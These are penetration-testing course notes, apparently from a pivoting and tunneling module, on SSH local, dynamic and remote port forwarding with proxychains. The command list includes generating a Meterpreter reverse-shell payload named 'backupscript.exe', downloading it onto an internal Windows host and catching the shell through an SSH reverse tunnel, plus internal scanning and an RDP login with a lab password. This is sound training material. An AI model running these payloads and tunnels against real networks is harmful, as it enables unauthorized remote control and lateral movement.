# NOTE — SSH Port Forwarding: Local, Dynamic, and Remote

## ID
604

## Module
Pivoting, Tunneling, and Port Forwarding

## Kind
notes

## Title
Section 5 — SSH Port Forwarding: Local, Dynamic, and Remote

## Description
Complete guide to SSH port forwarding: local (`-L`) for single ports, dynamic (`-D`) for SOCKS proxies with proxychains, and remote (`-R`) for reverse shells through a pivot host.

## Tags
ssh, port-forwarding, socks, proxychains, reverse-shell, pivoting

## Commands
- `ssh -L 1234:localhost:3306 ubuntu@<TARGET_IP>`
- `ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@<TARGET_IP>`
- `netstat -antp | grep 1234`
- `nmap -v -sV -p1234 localhost`
- `ssh -D 9050 ubuntu@<TARGET_IP>`
- `echo "socks4 127.0.0.1 9050" | sudo tee -a /etc/proxychains4.conf`
- `proxychains nmap -v -sn 172.16.5.1-200`
- `proxychains nmap -v -Pn -sT 172.16.5.19`
- `proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`
- `msfvenom -p windows/x64/meterpreter/reverse_https lhost=<PIVOT_IP> -f exe -o backupscript.exe lport=8080`
- `msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost 0.0.0.0; set lport 8000; run"`
- `scp backupscript.exe ubuntu@<PIVOT_IP>:~/`
- `python3 -m http.server 8123`
- `Invoke-WebRequest -Uri "http://<PIVOT_IP>:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`
- `ssh -R <PIVOT_IP>:8080:0.0.0.0:8000 ubuntu@<PIVOT_IP> -vN`

## What This Section Covers
SSH provides three types of port forwarding: local (`-L`) to bring a remote service to your attack host; dynamic (`-D`) to create a SOCKS proxy for routing arbitrary traffic through a pivot; and remote (`-R`) to expose your attack host’s listener to an internal target via a pivot. This section explains each method with practical examples, including proxychains configuration and catching reverse shells through a dual‑homed pivot.

## Methodology

### Local Forwarding (`-L`)
1. Identify a service on the pivot or internal network (e.g., MySQL on localhost:3306).
2. Run `ssh -L local_port:target_host:target_port user@pivot`
3. Access the service on your attack host at `localhost:local_port`.

### Dynamic Forwarding (`-D` + proxychains)
1. Start a SOCKS proxy on your attack host: `ssh -D 9050 user@pivot`
2. Keep the SSH session open.
3. Configure `/etc/proxychains4.conf` with `socks4 127.0.0.1 9050`.
4. Prefix any TCP tool with `proxychains` to tunnel traffic through the pivot.

### Remote Forwarding (`-R`)
1. Generate a reverse shell payload with `LHOST` = pivot’s internal IP (the IP the target can reach).
2. Start a listener on your attack host bound to `0.0.0.0`.
3. Transfer the payload to the pivot and serve it (e.g., via HTTP).
4. Download and execute the payload on the internal target.
5. Create an SSH reverse tunnel: `ssh -R pivot_ip:listen_port:0.0.0.0:attack_port user@pivot`
6. The shell connects to the pivot, which forwards it back to your attack host.

## Multi-step Workflow

### Dynamic Forwarding Example
```bash
# Terminal 1: start SOCKS tunnel
ssh -D 9050 ubuntu@172.16.5.129

# Terminal 2: configure proxychains (once)
echo "socks4 127.0.0.1 9050" | sudo tee -a /etc/proxychains4.conf

# Use tools
proxychains nmap -v -sn 172.16.5.1-200
proxychains nmap -v -Pn -sT 172.16.5.19
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|pivoting-tunneling]]  
← [[02-networking-basics]] | [[06-meterpreter-port-forwarding]] →
<!-- AUTO-LINKS-END -->
